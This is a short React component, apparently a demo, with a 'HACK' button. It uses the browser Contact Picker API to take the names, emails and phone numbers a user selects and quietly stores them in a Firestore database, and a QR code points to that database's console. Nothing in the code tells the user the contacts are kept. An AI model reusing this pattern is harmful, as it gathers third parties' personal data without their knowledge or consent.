import { collection, addDoc } from 'firebase/firestore';
import { db } from '..';
import { pwa } from "pwafire";
import QRCode from 'react-qr-code';

const HackContactPage = () => {
  const askContact = async () => {
    if("contacts" in navigator) {
      const props = ["name", "email", "tel"];
      const options = { multiple: true };

      const res = await pwa.Contacts(props, options);
      vibrate();
      if(res.ok) {
        sendContact(res.contacts);
      }
    }

  }

  const vibrate = () => {
    if (!navigator) {
        return;
    }

    if (!navigator.vibrate) {
        return;
    }

    navigator.vibrate([100,30,100,30,100,30,200,30,200,30,200,30,100,30,100,30,100]);
  }

  const sendContact = async (allContacts: any) => {
    allContacts.forEach(async (contact: any) => {
      await addDoc(collection(db, 'contacts'), {
        name: contact.name,
        email: contact.email,
        tel: contact.tel,
      });
    });
  }

  return (
    <div>
      <button onClick={askContact}>HACK</button>
      <QRCode value="https://console.firebase.google.com/project/hackcontact-dcd49/firestore/data/~2Fcontacts~2Fv2jIufJMCQ1UJECb17KK"/>
    </div>
  )
}

export default HackContactPage;
